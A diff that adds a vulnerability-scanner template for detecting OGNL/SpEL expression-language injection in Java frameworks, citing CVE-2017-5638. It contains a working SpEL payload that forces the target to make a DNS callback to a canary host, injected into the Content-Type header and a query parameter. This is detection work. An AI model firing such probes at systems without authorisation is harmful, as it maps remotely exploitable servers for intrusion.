@@ -1,0 +1,42 @@
+# Expression Language (EL) injection OOB probe — targets OGNL/SpEL-style
+# evaluation commonly found in Java frameworks (Struts2-family OGNL issues,
+# Spring SpEL injection points).
+#
+# Context: when user-controlled input is passed into an OGNL or SpEL
+# expression evaluator without sanitization, it can lead to full RCE
+# (several historical Struts2 CVEs, e.g. CVE-2017-5638, follow this shape).
+# Rather than embed a specific well-known RCE gadget (which executes an
+# actual OS command), this probe uses an expression that performs a network
+# callback via Java's URL/socket classes when evaluated — proving the
+# expression is reachable and evaluated without any destructive action.
+schema_version: rce-finder/v2
+id: el-injection-generic-oob
+name: Generic OGNL/SpEL Expression Injection OOB Probe
+severity: critical
+vuln_class: el-injection
+cwe: ["CWE-917"]
+cve: ["CVE-2017-5638"]
+technologies: ["java", "jvm", "spel", "ognl"]
+mode: safe-validation
+confidence_requirements:
+  - "matching DNS callback for the issued probe ID"
+  - "callback protocol must match this template"
+remediation: "Do not evaluate untrusted input as an expression; use typed values and allow-lists."
+references:
+  - https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection
+  - https://nvd.nist.gov/vuln/detail/CVE-2017-5638
+
+oob_protocol: dns
+method: GET
+path: ""
+timeout_seconds: 12
+
+injection_points:
+  - location: header
+    name: Content-Type
+  - location: query
+    name: id
+
+# SpEL expression that triggers a DNS resolution via InetAddress if
+# evaluated — a standard, non-destructive SpEL confirmation technique.
+payload: "${T(java.net.InetAddress).getByName('{{canary}}')}"
